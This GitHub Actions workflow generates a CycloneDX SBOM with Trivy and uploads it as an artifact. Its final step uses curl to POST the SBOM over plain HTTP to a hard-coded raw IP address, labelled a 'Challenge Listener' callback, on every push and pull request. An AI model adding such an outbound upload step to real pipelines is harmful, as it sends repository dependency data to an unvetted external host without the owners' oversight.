name: CycloneDX SBOM

on:
  push:
    branches: [ "main" ]
  pull_request:

jobs:
  sbom:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Run Trivy to generate SBOM
        uses: aquasecurity/trivy-action@v0.36.0
        with:
          scan-type: fs
          format: cyclonedx
          output: sbom.json
          ignore-unfixed: true
          severity: HIGH,CRITICAL

      - name: Upload SBOM artifact
        uses: actions/upload-artifact@v4
        with:
          name: cyclonedx-sbom
          path: sbom.json

      - name: Send SBOM to Challenge Listener
        run: |
          echo "Posting SBOM to Challenge Listener..."
          curl -X POST -H "Content-Type: multipart/form-data" \
            -F "file=@sbom.json" \
            http://35.219.156.43:8880/callback
